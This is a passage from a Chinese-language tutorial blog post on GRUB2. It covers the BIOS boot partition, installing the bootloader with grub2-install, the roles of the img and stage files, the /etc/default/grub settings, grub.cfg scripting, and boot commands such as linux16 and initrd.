boot分区信息，从中可见，它大小为1M，没有文件系统，分区表示为bios_grub。</p><p><img src="/picture/16/1.png" alt="img"></p><p>下图为gpt磁盘在图形界面下安装操作系统时创建的Bios boot分区。</p><p><img src="/picture/16/2.png" alt="img"></p><h2 id="1-7-进入grub命令行"><a href="#1-7-进入grub命令行" class="headerlink" title="1.7 进入grub命令行"></a>1.7 进入grub命令行</h2><p>在传统的grub上，可以直接在bash下敲入grub命令进入命令交互模式，但grub2只能在系统启动前进入grub交互命令行。</p><p>按下e见可以编辑所选菜单对应的grub菜单配置项，按下c键可以进入grub命令行交互模式。</p><p><img src="/picture/16/3.png" alt="img"></p><p><img src="/picture/16/4.png" alt="img"></p><h1 id="2-安装grub2"><a href="#2-安装grub2" class="headerlink" title="2 安装grub2"></a>2 安装grub2</h1><p>官方手册原文：<a href="https://www.gnu.org/software/grub/manual/html_node/Installing-GRUB-using-grub_002dinstall.html#Installing-GRUB-using-grub_002dinstall" target="_blank" rel="noopener">https://www.gnu.org/software/grub/manual/html_node/Installing-GRUB-using-grub_002dinstall.html#Installing-GRUB-using-grub_002dinstall</a></p><p>这里的安装指的不是安装grub程序，而是安装Boot loader，但一般都称之为安装grub，且后文都是这个意思。</p><h2 id="2-1-grub安装命令"><a href="#2-1-grub安装命令" class="headerlink" title="2.1 grub安装命令"></a>2.1 grub安装命令</h2><p>安装方式非常简单，只需调用grub2-install，然后给定安装到的设备名即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell&gt; grub2-install &#x2F;dev&#x2F;sda</span><br></pre></td></tr></table></figure><p>这样的安装方式，默认会将img文件放入到/boot目录下，如果想自定义放置位置，则使用–boot-directory选项指定，可用于测试练习grub的时候使用，但在真实的grub环境下不建议做任何改动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell&gt; grub2-install --boot-director&#x3D;&#x2F;mnt&#x2F;boot &#x2F;dev&#x2F;fd0</span><br></pre></td></tr></table></figure><p>如果是EFI固件平台，则必须挂载好efi系统分区，一般会挂在/boot/efi下，这是默认的，此时可直接使用grub2-install安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell&gt; grub2-install</span><br></pre></td></tr></table></figure><p>如果不是挂载在/boot/efi下，则使用–efi-directory指定efi系统分区路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell&gt; grub2-install --efi-directory&#x3D;&#x2F;mnt&#x2F;efi</span><br></pre></td></tr></table></figure><p>grub2-install实际上是一个shell脚本，用于调用其他工具，真正的功能都是其他工具去完成的，所以如果非常熟悉grub内部命令和机制，完全可以不用grub2-install。</p><p>对应传统的grub安装命令为grub-install，用法和grub2-install一样。</p><h2 id="2-2-各种img和stage文件的说明"><a href="#2-2-各种img和stage文件的说明" class="headerlink" title="2.2 各种img和stage文件的说明"></a>2.2 各种img和stage文件的说明</h2><p>官方手册原文：<a href="https://www.gnu.org/software/grub/manual/html_node/Images.html#Images" target="_blank" rel="noopener">https://www.gnu.org/software/grub/manual/html_node/Images.html#Images</a></p><p>img文件是grub2生成的，stage文件是传统grub生成的。下面是各种文件的说明。</p><h3 id="2-2-1-grub2中的img文件"><a href="#2-2-1-grub2中的img文件" class="headerlink" title="2.2.1 grub2中的img文件"></a>2.2.1 grub2中的img文件</h3><p>grub2生成了好几个img文件，有些分布在/usr/lib/grub/i386-pc目录下，有些分布在/boot/grub2/i386-pc目录下，它们之间的关系，相信看了下文之后就会明白了。</p><p><img src="/picture/16/5.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/733013/201706/733013-20170629150024164-72442842.png" alt="img"></p><p>下图描述了各个img文件之间的关系。其中core.img是动态生成的，路径为/boot/grub2/i386-pc/core.img，而其他的img则存在于/usr/lib/grub/i386-pc目录下。当然，在安装grub时，boot.img会被拷贝到/boot/grub2/i386-pc目录下。</p><p><img src="/picture/16/6.png" alt="img"></p><p>(1)boot.img</p><p>在BIOS平台下，boot.img是grub启动的第一个img文件，它被写入到MBR中或分区的boot sector中，因为boot sector的大小是512字节，所以该img文件的大小也是512字节。</p><p>boot.img唯一的作用是读取属于core.img的第一个扇区并跳转到它身上，将控制权交给该扇区的img。由于体积大小的限制，boot.img无法理解文件系统的结构，因此grub2-install将会把core.img的位置硬编码到boot.img中，这样就一定能找到core.img的位置。</p><p>(2)core.img</p><p>core.img根据diskboot.img、kernel.img和一系列的模块被grub2-mkimage程序动态创建。core.img中嵌入了足够多的功能模块以保证grub能访问/boot/grub，并且可以加载相关的模块实现相关的功能，例如加载启动菜单、加载目标操作系统的信息等，由于grub2大量使用了动态功能模块，使得core.img体积变得足够小。</p><p>core.img中包含了多个img文件的内容，包括diskboot.img/kernel.img等。</p><p>core.img的安装位置随MBR磁盘和GPT磁盘而不同，这在上文中已经说明过了。</p><p>(3)diskboot.img</p><p>如果启动设备是硬盘，即从硬盘启动时，core.img中的第一个扇区的内容就是diskboot.img。diskboo.img的作用是读取core.img中剩余的部分到内存中，并将控制权交给kernel.img，由于此时还不识别文件系统，所以将core.img的全部位置以block列表的方式编码，使得diskboot.img能够找到剩余的内容。</p><p>该img文件因为占用一个扇区，所以体积为512字节。</p><p>(4)cdboot.img</p><p>如果启动设备是光驱(cd-rom)，即从光驱启动时，core.img中的第一个扇区的的内容就是cdboo.img。它的作用和diskboot.img是一样的。</p><p>(5)pexboot.img</p><p>如果是从网络的PXE环境启动，core.img中的第一个扇区的内容就是pxeboot.img。</p><p>(6)kernel.img</p><p>kernel.img文件包含了grub的基本运行时环境：设备框架、文件句柄、环境变量、救援模式下的命令行解析器等等。很少直接使用它，因为它们已经整个嵌入到了core.img中了。注意，kernel.img是grub的kernel，和操作系统的内核无关。</p><p>如果细心的话，会发现kernel.img本身就占用28KB空间，但嵌入到了core.img中后，core.img文件才只有26KB大小。这是因为core.img中的kernel.img是被压缩过的。</p><p>(7)lnxboot.img</p><p>该img文件放在core.img的最前部位，使得grub像是linux的内核一样，这样core.img就可以被LILO的”image=”识别。当然，这是配合LILO来使用的，但现在谁还适用LILO呢？</p><p>(8)*.mod</p><p>各种功能模块，部分模块已经嵌入到core.img中，或者会被grub自动加载，但有时也需要使用insmod命令手动加载。</p><h3 id="2-2-2-传统grub中的stage文件"><a href="#2-2-2-传统grub中的stage文件" class="headerlink" title="2.2.2 传统grub中的stage文件"></a>2.2.2 传统grub中的stage文件</h3><p>grub2的设计方式和传统grub大不相同，因此和stage之间的对比关系其实没那么标准，但是将它们拿来比较也有助于理解img和stage文件的作用。</p><p>stage文件也分布在两个地方：/usr/share/grub/RELEASE目录下和/boot/grub目录下，/boot/grub目录下的stage文件是安装grub时从/usr/share/grub/RELEASE目录下拷贝过来的。</p><p><img src="/picture/16/7.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/733013/201706/733013-20170629150214774-224331295.png" alt="img"></p><p>(1)stage1</p><p>stage1文件在功能上等价于boot.img文件。目的是跳转到stage1_5或stage2的第一个扇区上。</p><p>(2)*_stage1_5</p><p>*stage1_5文件包含了各种识别文件系统的代码，使得grub可以从文件系统中读取体积更大功能更复杂的stage2文件。从这一方面考虑，它类似于core.img中加载对应文件系统模块的代码部分，但是core.img的功能远比stage1_5多。</p><p>stage1_5一般安装在MBR后、第一个分区前的那段空闲空间中，也就是MBR gap空间，它的作用是跳转到stage2的第一个扇区。</p><p>其实传统的grub在某些环境下是可以不用stage1_5文件就能正常运行的，但是grub2则不能缺少core.img。</p><p>(3)stage2</p><p>stage2的作用是加载各种环境和加载内核，在grub2中没有完全与之相对应的img文件，但是core.img中包含了stage2的所有功能。</p><p>当跳转到stage2的第一个扇区后，该扇区的代码负责加载stage2剩余的内容。</p><p>注意，stage2是存放在磁盘上的，并没有像core.img一样嵌入到磁盘上。</p><p>(4)stage2_eltorito</p><p>功能上等价于grub2中的core.img中的cdboot.img部分。一般在制作救援模式的grub时才会使用到cd-rom相关文件。</p><p>(5)pxegrub</p><p>功能上等价于grub2中的core.img中的pxeboot.img部分。</p><h2 id="2-3-安装grub涉及的过程"><a href="#2-3-安装grub涉及的过程" class="headerlink" title="2.3 安装grub涉及的过程"></a>2.3 安装grub涉及的过程</h2><p>安装grub2的过程大体分两步：一是根据/usr/lib/grub/i386-pc/目录下的文件生成core.img，并拷贝boot.img和core.img涉及的某些模块文件到/boot/grub2/i386-pc/目录下；二是根据/boot/grub2/i386-pc目录下的文件向磁盘上写boot loader。</p><p>当然，到底是先拷贝，还是先写boot  loader，没必要去搞清楚，只要/boot/grub2/i386-pc下的img文件一定能通过grub2相关程序再次生成boot  loader。所以，既可以认为/boot/grub2/i386-pc目录下的img文件是boot  loader的特殊备份文件，也可以认为是boot loader的源文件。</p><p>不过，img文件和boot loader的内容是不一致的，因为img文件还要通过grub2相关程序来转换才是真正的boot loader。</p><p>对于传统的grub而言，拷贝的不是img文件，而是stage文件。</p><p>以下是安装传统grub时，grub做的工作。很不幸，grub2上没有该命令，也没有与之等价的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">grub&gt; setup (hd0)</span><br><span class="line"> Checking if &quot;&#x2F;boot&#x2F;grub&#x2F;stage1&quot; exists... yes</span><br><span class="line"> Checking if &quot;&#x2F;boot&#x2F;grub&#x2F;stage2&quot; exists... yes</span><br><span class="line"> Checking if &quot;&#x2F;boot&#x2F;grub&#x2F;e2fs_stage1_5&quot; exists... yes</span><br><span class="line"> Running &quot;embed &#x2F;boot&#x2F;grub&#x2F;e2fs_stage1_5 (hd0)&quot;...  15 sectors are embedded.</span><br><span class="line">succeeded</span><br><span class="line"> Running &quot;install &#x2F;boot&#x2F;grub&#x2F;stage1 (hd0) (hd0)1+15 p (hd0,0)&#x2F;boot&#x2F;grub&#x2F;stage2 &#x2F;boot&#x2F;grub&#x2F;menu.lst&quot;... succeeded</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure><p>首先检测各stage文件是否存在于/boot/grub目录下，随后嵌入stage1_5到磁盘上，该文件系统类型的stage1_5占用了15个扇区，最后安装stage1，并告知stage1  stage1_5的位置是第1到第15个扇区，之所以先嵌入stage1_5再嵌入stage1就是为了让stage1知道stage1_5的位置，最后还告知了stage1 stage2和配置文件menu.lst的路径。</p><h1 id="3-grub2配置文件"><a href="#3-grub2配置文件" class="headerlink" title="3 grub2配置文件"></a>3 grub2配置文件</h1><p>grub2的默认配置文件为/boot/grub2/grub.cfg，该配置文件的写法弹性非常大，但绝大多数需要修改该配置文件时，都只需修改其中一小部分内容就可以达成目标。</p><p>grub2-mkconfig程序可用来生成符合绝大多数情况的grub.cfg文件，默认它会自动尝试探测有效的操作系统内核，并生成对应的操作系统菜单项。使用方法非常简单，只需一个选项”-o”指定输出文件即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell&gt; grub2-mkconfig -o &#x2F;boot&#x2F;grub2&#x2F;grub.cfg</span><br></pre></td></tr></table></figure><h2 id="3-1-通过-etc-default-grub文件生成grub-cfg"><a href="#3-1-通过-etc-default-grub文件生成grub-cfg" class="headerlink" title="3.1 通过/etc/default/grub文件生成grub.cfg"></a>3.1 通过/etc/default/grub文件生成grub.cfg</h2><p>官方手册原文：<a href="https://www.gnu.org/software/grub/manual/html_node/Simple-configuration.html#Simple-configuration" target="_blank" rel="noopener">https://www.gnu.org/software/grub/manual/html_node/Simple-configuration.html#Simple-configuration</a></p><p><strong>grub2-mkconfig是根据/etc/default/grub文件来创建配置文件的。</strong>该文件中定义的是grub的全局宏，修改内置的宏可以快速生成grub配置文件。实际上在/etc/grub.d/目录下还有一些grub配置脚本，这些shell脚本读取一些脚本配置文件(如/etc/default/grub)，根据指定的逻辑生成grub配置文件。若有兴趣，不放读一读/etc/grub.d/10_linux文件，它指导了创建grub.cfg的细节，例如如何生成启动菜单。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@xuexi ~]# ls &#x2F;etc&#x2F;grub.d&#x2F;</span><br><span class="line">00_header  00_tuned  01_users  10_linux  20_linux_xen  20_ppc_terminfo  30_os-prober  40_custom  41_custom  README</span><br></pre></td></tr></table></figure><p>在/etc/default/grub中，使用”key=vaule”的格式，key全部为大小字母，如果vaule部分包含了空格或其他特殊字符，则需要使用引号包围。</p><p>例如，下面是一个/etc/default/grub文件的示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@xuexi ~]# cat &#x2F;etc&#x2F;default&#x2F;grub</span><br><span class="line">GRUB_TIMEOUT&#x3D;5</span><br><span class="line">GRUB_DISTRIBUTOR&#x3D;&quot;$(sed &#39;s, release .*$,,g&#39; &#x2F;etc&#x2F;system-release)&quot;</span><br><span class="line">GRUB_DEFAULT&#x3D;saved</span><br><span class="line">GRUB_DISABLE_SUBMENU&#x3D;true</span><br><span class="line">GRUB_TERMINAL_OUTPUT&#x3D;&quot;console&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX&#x3D;&quot;crashkernel&#x3D;auto biosdevname&#x3D;0 net.ifnames&#x3D;0 rhgb quiet&quot;</span><br><span class="line">GRUB_DISABLE_RECOVERY&#x3D;&quot;true&quot;</span><br></pre></td></tr></table></figure><p>虽然可用的宏较多，但可能用的上的就几个：GRUB_DEFAULT、GRUB_TIMEOUT、GRUB_CMDLINE_LINUX和GRUB_CMDLINE_LINUX_DEFAULT。</p><p>以下列出了部分key。</p><p>(1).GRUB_DEFAULT</p><p>默认的菜单项，默认值为0。其值可为数值N，表示从0开始计算的第N项是默认菜单，也可以指定对应的title表示该项为默认的菜单项。使用数值比较好，因为使用的title可能包含了容易改变的设备名。例如有如下菜单项：</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">menuentry &#96;&#96;&#39;Example GNU&#x2F;Linux distribution&#39;&#96; &#96;--class gnu-linux --&#96;&#96;id&#96; &#96;example-gnu-linux &#123;&#96;&#96;  &#96;&#96;...&#96;&#96;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>如果想将此菜单设为默认菜单，则可设置”GRUB_DEFAULT=example-gnu-linux”。</p><p>如果GRUB_DEFAULT的值设置为”saved”，则表示默认的菜单项是”GRUB_SAVEDEFAULT”或”grub-set-default”所指定的菜单项。</p><p>(2).GRUB_SAVEDEFAULT</p><p>默认该key的值未设置。如果该key的值设置为true时，如果选定了某菜单项，则该菜单项将被认为是新的默认菜单项。该key只有在设置了”GRUB_DEFAULT=saved”时才有效。</p><p>不建议使用该key，因为GRUB_DEFAULT配合grub-set-default更方便。</p><p>(3).GRUB_TIMEOUT</p><p>在开机选择菜单项的超时时间，超过该时间将使用默认的菜单项来引导对应的操作系统。默认值为5秒。等待过程中，按下任意按键都可以中断等待。</p><p>设置为0时，将不列出菜单直接使用默认的菜单项引导与之对应的操作系统，设置为”-1”时将永久等待选择。</p><p>是否显示菜单，和”GRUB_TIMEOUT_STYLE”的设置有关。</p><p>(4).GRUB_TIMEOUT_STYLE</p><p>如果该key未设置值或者设置的值为”menu”，则列出启动菜单项，并等待”GRUB_TIMEOUT”指定的超时时间。</p><p>如果设置为”countdown”和”hidden”，则不显示启动菜单项，而是直接等待”GRUB_TIMEOUT”指定的超时时间，如果超时了则启动默认菜单项并引导对应的操作系统。在等待过程中，按下”ESC”键可以列出启动菜单。设置为countdown和hidden的区别是countdown会显示超时时间的剩余时间，而hidden则完全隐藏超时时间。</p><p>(5).GRUB_DISTRIBUTOR</p><p>设置发行版的标识名称，一般该名称用来作为菜单的一部分，以便区分不同的操作系统。</p><p>(6).GRUB_CMDLINE_LINUX</p><p>添加到菜单中的内核启动参数。例如：</p><blockquote><p>GRUB_CMDLINE_LINUX=”crashkernel=ro root=/dev/sda3 biosdevname=0 net.ifnames=0 rhgb quiet”</p></blockquote><p>(7).GRUB_CMDLINE_LINUX_DEFAULT</p><p>除非”GRUB_DISABLE_RECOVERY”设置为”true”，否则该key指定的默认内核启动参数将生成两份，一份是用于默认启动参数，一份用于恢复模式(recovery mode)的启动参数。</p><p>该key生成的默认内核启动参数将添加在”GRUB_CMDLINE_LINUX”所指定的启动参数之后。</p><p>(8).GRUB_DISABLE_RECOVERY</p><p>该项设置为true时，将不会生成恢复模式的菜单项。</p><p>(9).GRUB_DISABLE_LINUX_UUID</p><p>默认情况下，grub2-mkconfig在生产菜单项的时候将使用uuid来标识Linux 内核的根文件系统，即”root=UUID=…”。</p><p>例如，下面是/boot/grub2/grub.cfg中某菜单项的部分内容。</p><blockquote><p>menuentry ‘CentOS Linux (3.10.0-327.el7.x86_64) 7 (Core)’  –class centos –class gnu-linux –class gnu –class os –unrestricted  $menuentry_id_option  ‘gnulinux-3.10.0-327.el7.x86_64-advanced-b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8’ {</p><p>​    ……</p><p>​    linux16 /vmlinuz-3.10.0-327.el7.x86_64 <strong>root=UUID=b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8</strong> ro crashkernel=auto biosdevname=0 net.ifnames=0 quiet LANG=en_US.UTF-8</p><p>​    initrd16 /initramfs-3.10.0-327.el7.x86_64.img</p><p>}</p></blockquote><p>虽然使用UUID的方式更可靠，但有时候不太方便，所以可以设置该key为true来禁用。</p><p>(10).GRUB_BACKGROUND</p><p>设置背景图片，背景图片必须是grub可读的，图片文件名后缀必须是”.png”、”.tga”、”.jpg”、”.jpeg”，在需要的时候，grub会按比例缩小图片的大小以适配屏幕大小。</p><p>(11).GRUB_THEME</p><p>设置grub菜单的主题。</p><p>(12).GRUB_GFXPAYLOAD_LINUX</p><p>设置为”text”时，将强制使用文本模式启动Linux。在某些情况下，可能不支持图形模式。</p><p>(13).GRUB_DISABLE_OS_PROBER</p><p>默认情况下，grub2-mkconfig会尝试使用os-prober程序(如果已经安装的话，默认应该都装了)探测其他可用的操作系统内核，并为其生成对应的启动菜单项。设置为”true”将禁用自动探测功能。</p><p>(14).GRUB_DISABLE_SUBMENU</p><p>默认情况下，grub2-mkconfig如果发现有多个同版本的或低版本的内核时，将只为最高版本的内核生成顶级菜单，其他所有的低版本内核菜单都放入子菜单中，设置为”y”将全部生成为顶级菜单。</p><p>(15).GRUB_HIDDEN_TIMEOUT(已废弃，但为了向后兼容，仍有效)</p><p>使用”GRUB_TIMEOUT_STYLE={countdown|hidden}”替代该项</p><p>(16).GRUB_HIDDEN_TIMEOUT_QUIET(已废弃，但为了向后兼容，仍有效)</p><p>配合GRUB_HIDDEN_TIMEOUT使用，可以使用GRUB_TIMEOUT_STYLE=countdown来替代这两项。</p><h2 id="3-2-脚本方式直接编写grub-cfg文件"><a href="#3-2-脚本方式直接编写grub-cfg文件" class="headerlink" title="3.2 脚本方式直接编写grub.cfg文件"></a>3.2 脚本方式直接编写grub.cfg文件</h2><p>官方手册原文：<a href="https://www.gnu.org/software/grub/manual/html_node/Shell_002dlike-scripting.html#Shell_002dlike-scripting" target="_blank" rel="noopener">https://www.gnu.org/software/grub/manual/html_node/Shell_002dlike-scripting.html#Shell_002dlike-scripting</a></p><ul><li><p>注释符：从#开始的字符都被认为是注释，所以grub支持行中注释</p></li><li><p>连接操作符：{ } | &amp; $ ; &lt; &gt;</p></li><li><p>保留关键字和符号：! [[ ]] { } case do done elif else esac fi for function if in menuentry select then time until while。并非所有的关键字都有用，只是为了日后的功能扩展而提前提供的。</p></li><li><p>引号和转义符</p></li></ul><p>对于特殊的字符需要转义。有三种方式转义：使用反斜线、使用单引号、使用双引号。</p><p>反斜线转义方式和shell一样。</p><p>单引号中的所有字符串都是字面意思，没有任何特殊意义，即使单引号中的转义符也被认为是纯粹的字符。所以’&#39;‘是无法保留单引号的。单引号需要使用双引号来转移，所以应该写”‘“。</p><p>双引号和单引号作用一样，但它不能转义某几个特殊字符，包括”$”和”&quot;。对于双引号中的”$”符号，它任何时候都保留本意。对于”&quot;，只有反斜线后的字符是’$’、’”‘、’&#39;时才表示转义的意思，另外 ，某行若以反斜线结尾，则表示续行，但官方不建议在grub.cfg中使用续行符。</p><ul><li>变量扩展</li></ul><p>使用$符号引用变量，也可以使用${var}的方式引用var变量。</p><p>支持位置变量，例如$1引用的是第一个参数。</p><p>还支持特殊的变量，如$?表示上一次命令的退出状态码。如果使用了位置变量，则还支持$<em>、$@和$#，$</em>代表的所有参数整体，各参数之间是不可分割的，$@也代表所有变量，但$@的各参数是可以被分割的，$#表示参数的个数。</p><ul><li>简单的命令</li></ul><p>可以在grub.cfg中使用简单的命令。各命令之间使用换行符或分号表示该命令结束。</p><p>如果在命令前使用了”!”，则表示逻辑取反。</p><ul><li>循环结构：for name in word …; do list; done</li><li>循环结构：while cond; do list; done</li><li>循环结构：until cond; do list; done</li><li>条件判断结构：if list; then list; [elif list; then list;] … [else list;] fi</li><li>函数结构：function name { command; … }</li><li>菜单项命令：menuentry title [–class=class …] [–users=users] [–unrestricted] [–hotkey=key] [–id=id] { command; … }</li></ul><p>这是grub.cfg中最重要的项，官方原文：<a href="https://www.gnu.org/software/grub/manual/html_node/menuentry.html#menuentry" target="_blank" rel="noopener">https://www.gnu.org/software/grub/manual/html_node/menuentry.html#menuentry</a></p><p>该命令定义了一个名为title的grub菜单项。当开机时选中该菜单项时，grub会将chosen环境变量的值赋给”–id”(如果给定了”–id”的话)，执行大括号中的命令列表，如果直到最后一个命令都全部执行成功，且成功加载了对应的内核后，将执行boot命令。随后grub就将控制权交给了操作系统内核。</p><p>–class：该选项用于将菜单分组，从而使得grub可以通过主题样式为不同组的菜单显示不同的样式风格。一个menuentry中，可以使用多次class表示将该菜单分到多个组中去。</p><p>–users：该选项限定只有此处列出的用户才能访问该菜单项，不指定该选项时将表示所有用户都能访问该菜单。</p><p>–unrestricted：该选项表示所有用户都有权访问该菜单项。</p><p>–hotkey：该选项为该菜单项关联一个热键，也就是快捷键，关联热键后只要按下该键就会选中该菜单。热键只能是字母键、backspace键、tab键或del键。</p><p>–id：该选项为该菜单关联一个唯一的数值。id的值可以由ASCII字母、数字//下划线组成，且不得以数字开头。</p><p>所有其他的参数包括title都被当作位置参数传递给大括号中的命令，但title总是$1，除title外的其余参数，位置值从前向后类推。</p><ul><li>break [n]：强制退出for/while/until循环</li><li>continue [n]：跳到下一次迭代，即进入下一次循环</li><li>return [n]：指定返回状态码</li><li>setparams [arg] …：从$1开始替换位置参数</li><li>shift [n]：踢掉前n个参数，使得第n+1个参数变为$1，但和shell中不一样的是，踢掉了前n个参数后，从$#-n+1到$#这些参数的位置不变</li></ul><p>具体如何编写grub.cfg文件，继续看下文的命令和变量。</p><h1 id="4-命令行和菜单项中的命令"><a href="#4-命令行和菜单项中的命令" class="headerlink" title="4 命令行和菜单项中的命令"></a>4 命令行和菜单项中的命令</h1><p>官方手册原文：<a href="https://www.gnu.org/software/grub/manual/html_node/Commands.html#Commands" target="_blank" rel="noopener">https://www.gnu.org/software/grub/manual/html_node/Commands.html#Commands</a></p><p>grub2支持很多命令，有些命令只能在交互式命令行下使用，有些命令可用在配置文件中。在救援模式下，只有insmod、ls、set和unset命令可用。</p><p>无需掌握所有的命令，掌握用的上的几个命令即可。</p><h2 id="4-1-help命令"><a href="#4-1-help命令" class="headerlink" title="4.1 help命令"></a>4.1 help命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help [pattern]</span><br></pre></td></tr></table></figure><p>显示能匹配到pattern的所有命令的说明信息和usage信息，如果不指定patttern，将显示所有命令的简短信息。</p><p>例如”help cmos”。</p><p><img src="/picture/16/8.png" alt="img"></p><h2 id="4-2-boot命令"><a href="#4-2-boot命令" class="headerlink" title="4.2 boot命令"></a>4.2 boot命令</h2><p>用于启动已加载的操作系统。</p><p>只在交互式命令行下可用。其实在menuentry命令的结尾就隐含了boot命令。</p><h2 id="4-3-set和unset命令"><a href="#4-3-set和unset命令" class="headerlink" title="4.3 set和unset命令"></a>4.3 set和unset命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set&#96; &#96;[envvar&#x3D;value]&#96;&#96;unset&#96; &#96;envvar</span><br></pre></td></tr></table></figure><p>前者设置环境变量envvar的值，如果不给定参数，则列出当前环境变量。</p><p>后者释放环境变量envvar。</p><h2 id="4-4-lsmod命令和insmod命令"><a href="#4-4-lsmod命令和insmod命令" class="headerlink" title="4.4 lsmod命令和insmod命令"></a>4.4 lsmod命令和insmod命令</h2><p>分别用于列出已加载的模块和调用指定的模块。</p><p>注意，若要导入支持ext文件系统的模块时，只需导入ext2.mod即可，实际上也没有ext3和ext4对应的模块。</p><h2 id="4-5-linux和linux16命令"><a href="#4-5-linux和linux16命令" class="headerlink" title="4.5 linux和linux16命令"></a>4.5 linux和linux16命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux &#96;&#96;file&#96; &#96;[kernel_args]&#96;&#96;linux16 &#96;&#96;file&#96; &#96;[kernel_args]</span><br></pre></td></tr></table></figure><p>都表示装载指定的内核文件，并传递内核启动参数。linux16表示以传统的16位启动协议启动内核，linux表示以32位启动协议启动内核，但linux命令比linux16有一些限制。但绝大多数时候，它们是可以通用的。</p><p>在linux或linux16命令之后，必须紧跟着使用init或init16命令装载init ramdisk文件。</p><p>一般为/boot分区下的vmlinuz-RELEASE_NUM文件。</p><p><img src="/picture/16/9.png" alt="img"></p><p>但在grub环境下，boot分区被当作root分区，即根分区，假如boot分区为第一块磁盘的第一个分区，则应该写成：</p><blockquote><p>linux (hd0,msdos1)/vmlinuz-XXX</p></blockquote><p>或者相对路径的：</p><blockquote><p>set root=’hd0,msdos1’</p><p>linux /vmlinuz-XXX</p></blockquote><p>在grub阶段可以传递内核的启动参数(内核的参数包括3类：编译内核时参数，启动时参数和运行时参数)，可以传递的启动参数非常非常多，完整的启动参数列表见：<a href="http://redsymbol.net/linux-kernel-boot-parameters。这里只列出几个常用的：" target="_blank" rel="noopener">http://redsymbol.net/linux-kernel-boot-parameters。这里只列出几个常用的：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">init&#x3D;   ：指定Linux启动的第一个进程init的替代程序。</span><br><span class="line">root&#x3D;   ：指定根文件系统所在分区，在grub中，该选项必须给定。</span><br><span class="line">ro,rw   ：启动时，根分区以只读还是可读写方式挂载。不指定时默认为ro。</span><br><span class="line">initrd  ：指定init ramdisk的路径。在grub中因为使用了initrd或initrd16命令，所以不需要指定该启动参数。</span><br><span class="line">rhgb    ：以图形界面方式启动系统。</span><br><span class="line">quiet   ：以文本方式启动系统，且禁止输出大多数的log message。</span><br><span class="line">net.ifnames&#x3D;0：用于CentOS 7，禁止网络设备使用一致性命名方式。</span><br><span class="line">biosdevname&#x3D;0：用于CentOS 7，也是禁止网络设备采用一致性命名方式。</span><br><span class="line">             ：只有net.ifnames和biosdevname同时设置为0时，才能完全禁止一致性命名，得到eth0-N的设备名。</span><br></pre></td></tr></table></figure><p>例如：</p><blockquote><p>linux16 /vmlinuz-3.10.0-327.el7.x86_64 root=UUID=edb1bf15-9590-4195-aa11-6dac45c7f6f3 ro rhgb quiet LANG=en_US.UTF-8</p></blockquote><p>另外，root启动参数有多种定义方式，可以使用UUID的方式指定，也可以直接指定根文件系统所在分区，如”root=/dev/sda2”，</p><h2 id="4-6-initrd和initrd16命令"><a href="#4-6-initrd和initrd16命令" class="headerlink" title="4.6 initrd和initrd16命令"></a>4.6 initrd和initrd16命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initrd &#96;&#96;file</span><br></pre></td></tr></table></figure><p>只能紧跟在linux或linux16命令之后使用，用于为即将启动的内核传递init ramdisk路径。</p><p>同样，基于根分区，可以使用绝对路径，也可以使用相对路径。路径的表示方法和linux或linux16命令相同。例如：</p><blockquote><p>linux16 /vmlinuz-0-rescue-d13bce5e247540a5b5886f2bf8aabb35 root=UUID=b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8 ro crashkernel=auto  quiet</p><p>initrd16 /initramfs-0-rescue-d13bce5e247540a5b5886f2bf8aabb35.img</p></blockquote><h2 id="4-7-search命令"><a href="#4-7-search命令" class="headerlink" title="4.7 search命令"></a>4.7 search命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search [--&#96;&#96;file&#96;&#96;|--label|--fs-uuid] [--&#96;&#96;set&#96; &#96;[var]] [--no-floppy] [--hint args] 